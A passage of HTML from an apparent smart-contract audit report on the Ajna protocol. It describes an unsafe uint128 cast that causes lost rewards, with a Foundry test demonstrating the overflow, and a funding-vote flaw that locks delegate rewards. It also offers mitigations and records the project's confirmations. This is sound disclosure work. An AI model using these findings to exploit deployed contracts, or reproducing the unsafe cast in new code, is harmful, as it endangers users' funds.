class=\"mtk12\">y</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">14</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">x</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">y</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">WAD</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">WAD</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">15</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>And will be equal to (0 + 0.5e18)/1e18=0, resulting in the user losing the reward.</p>\n<p>In <code>stake() &#x26; moveStakedLiquidity()</code> when <code>bucketExchangeRate >= type(uint128).max</code>:<br>\nIf an overflow occurs and <code>bucketExchangeRate</code> is reset to zero:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">05</span><span class=\"mtk1\">-</span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">toBucket</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rateAtStakeTime</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ajnaPool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">bucketExchangeRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">toIndex</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">241</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">bucketState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rateAtStakeTime</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ajnaPool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">bucketExchangeRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bucketId</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p>Results in the reward being skipped for one 1 epoch, because:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">497</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nextExchangeRate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">bucketExchangeRates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">pool_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">bucketIndex_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">nextEventEpoch_</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">498</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">499</span><span class=\"mtk1\">:             </span><span class=\"mtk3\">// calculate interest earned only if next exchange rate is higher than current exchange rate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">500</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">nextExchangeRate</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">exchangeRate_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">501</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">502</span><span class=\"mtk1\">:                 </span><span class=\"mtk3\">// calculate the equivalent amount of quote tokens given the stakes lp balance,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">503</span><span class=\"mtk1\">:                 </span><span class=\"mtk3\">// and the exchange rate at the next and current burn events</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">504</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">interestEarned_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wmul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nextExchangeRate</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">exchangeRate_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bucketLP_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">505</span><span class=\"mtk1\">:             }</span></span></span></code></pre>\n<p>The current rate will be equal to 0 or greater than 0, but less than the previous rate.</p>\n<p>Also, if the next epoch has a rate less than <code>type(uint128).max</code>, this will result in <code>interestEarned_ = Maths.wmul(nextExchangeRate - exchangeRate_, bucketLP_);</code>, where <code>nextExchangeRate - exchangeRate_</code> will be in the range of <code>2^128 - 1 - {0, N^18}</code>. This can lead to an overflow error when <code>bucketLP_</code> is large <code>(1e45)</code>, because <code>(2^128-1) * 1e38</code>, which in turn can cause the transaction to fail.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"c\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: ajna-core\\src\\libraries\\internal\\Maths.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">13</span><span class=\"mtk1\">:     function </span><span class=\"mtk11\">wmul</span><span class=\"mtk1\">(uint256 </span><span class=\"mtk12\">x</span><span class=\"mtk1\">, uint256 </span><span class=\"mtk12\">y</span><span class=\"mtk1\">) internal pure </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">14</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (x * y + WAD / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">) / WAD;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">15</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>Yes, in the case of LP, the number of tokens approaching <code>2^128</code> is highly unlikely and does not pose a direct threat to the user, except for not receiving the reward. But as for the bucketExchangeRate, since it is calculated according to different formulas, it cannot be ruled out that such a case is more likely</p>\n<p><strong>Tests for LP, which simply shows that overflow occurs:</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol b/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 4100e9f..58c3d8c 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -8,7 +8,7 @@ import &#39;src/interfaces/rewards/IRewardsManager.sol&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { ERC20Pool }           from &#39;src/ERC20Pool.sol&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { RewardsHelperContract }   from &#39;./RewardsDSTestPlus.sol&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+import &#39;@std/console2.sol&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> contract RewardsManagerTest is RewardsHelperContract {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address internal _borrower;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -127,6 +127,33 @@ contract RewardsManagerTest is RewardsHelperContract {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function test_Issue() external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // configure NFT position one</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256[] memory depositIndexes = new uint256[](1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        depositIndexes[0] = 9;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 mintAmount = uint256(type(uint128).max) + 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 tokenIdOne = _mintAndMemorializePositionNFT({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            indexes:    depositIndexes,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            minter:     _minterOne,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            mintAmount: mintAmount,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            pool:       address(_pool)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 lpBalance;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        (lpBalance, ) =_pool.lenderInfo(depositIndexes[0], address(_positionManager));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console2.log(&quot;_pool.lenderInfo for _positionManager before stake&quot;, lpBalance);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // minterOne deposits their NFT into the rewards contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _stakeToken({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            pool:    address(_pool),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            owner:   _minterOne,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            tokenId: tokenIdOne</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 lpsAtStakeTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 rateAtStakeTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        (lpsAtStakeTime, rateAtStakeTime) = _rewardsManager.getBucketStateStakeInfo(tokenIdOne, depositIndexes[0]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console2.log(&quot;getBucketStateStakeInfo.lpsAtStakeTime after stake&quot;, lpsAtStakeTime);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    </span></span></span></code></pre>\n<h3 id=\"tools-used-10\" style=\"position:relative;\"><a href=\"#tools-used-10\" aria-label=\"tools used 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<ul>\n<li>Manual review</li>\n<li>Foundry</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-20\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-20\" aria-label=\"recommended mitigation steps 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ul>\n<li>use OpenZeppelin’s SafeCast library when casting from uint256 to uint128.</li>\n<li>don’t make casting from uint256 to uint128</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/227#issuecomment-1555112539\">MikeHathaway (Ajna) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/227#issuecomment-1570236882\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Valid for the case of <code>bucketExchangeRate</code>.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-11-standardfundingfundingvote-should-not-allow-users-who-didnt-vote-in-screening-stage-to-vote\" style=\"position:relative;\"><a href=\"#m-11-standardfundingfundingvote-should-not-allow-users-who-didnt-vote-in-screening-stage-to-vote\" aria-label=\"m 11 standardfundingfundingvote should not allow users who didnt vote in screening stage to vote permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/224\">[M-11] <code>StandardFunding.fundingVote</code> should not allow users who didn’t vote in screening stage to vote</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/224\">nobody2018</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L519-L569\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L519-L569</a><br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L519\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L519</a></p>\n<p>Users who did not vote in the screening stage but voted in the funding stage are not allowed to claim rewards via <code>claimDelegateReward</code>. <strong>Voting in the funding stage will occupy the distribution ratio of rewards</strong>. Since these rewards cannot be claimed, in the long run, the ajnaToken balance of the GrantFund contract is inconsistent with <code>treasury</code>.</p>\n<h3 id=\"proof-of-concept-20\" style=\"position:relative;\"><a href=\"#proof-of-concept-20\" aria-label=\"proof of concept 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>At the beginning of the <code>StandardFunding.claimDelegateReward</code> function, check whether the caller voted in the screening stage.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimDelegateReward</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">distributionId_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardClaimed_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Revert if delegatee didn&#39;t vote in screening stage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-&gt;      </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">screeningVotesCast</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">DelegateRewardInvalid</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">QuarterlyDistribution</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_distributions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId_</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><code>StandardFunding.fundingVote</code> is used to vote in the funding stage. This function does not check whether the caller voted in the screening stage. <code>fundingVote</code> subcalls <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L612\">_fundingVote</a>, which affects the allocation of rewards. <code>_getDelegateReward</code> is used by <code>claimDelegateReward</code> to calculate the reward distributed to the caller.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getDelegateReward</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">QuarterlyDistribution</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentDistribution_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">QuadraticVoter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voter_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewards_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calculate the total voting power available to the voter that was allocated in the funding stage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPowerAllocatedByDelegatee</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">voter_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">voter_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">remainingVotingPower</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// if none of the voter&#39;s voting power was allocated, they receive no rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">votingPowerAllocatedByDelegatee</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calculate reward</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// delegateeReward = 10 % of GBC distributed as per delegatee Voting power allocated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-&gt;      </span><span class=\"mtk12\">rewards_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wdiv</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wmul</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">currentDistribution_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fundsAvailable</span><span class=\"mtk1\">,\t</span><span class=\"mtk3\">//total funds in current distribution</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">votingPowerAllocatedByDelegatee</span><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">//voter&#39;s vote power</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">currentDistribution_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fundingVotePowerCast</span><span class=\"mtk1\">\t</span><span class=\"mtk3\">//total vote power in current distribution</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\">;\t\t\t\t\t\t</span><span class=\"mtk3\">// 10% fundsAvailable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>As long as <code>fundingVote</code> is successfully called, it means that <strong>the reward is locked to the caller</strong>. However, the caller cannot claim these rewards. <strong>There is no code to calculate the amount of these rewards that can never be claimed</strong>.</p>\n<h3 id=\"recommended-mitigation-steps-21\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-21\" aria-label=\"recommended mitigation steps 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Two ways to fix this problem:</p>\n<ol>\n<li><code>FundingVote</code> does not allow users who didn’t vote in screening stage.</li>\n<li>Delete the code on line <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L240\">L240</a>.</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/224#issuecomment-1555111296\">MikeHathaway (Ajna) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-12-governance-attack-on-extraordinary-proposals\" style=\"position:relative;\"><a href=\"#m-12-governance-attack-on-extraordinary-proposals\" aria-label=\"m 12 governance attack on extraordinary proposals permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" 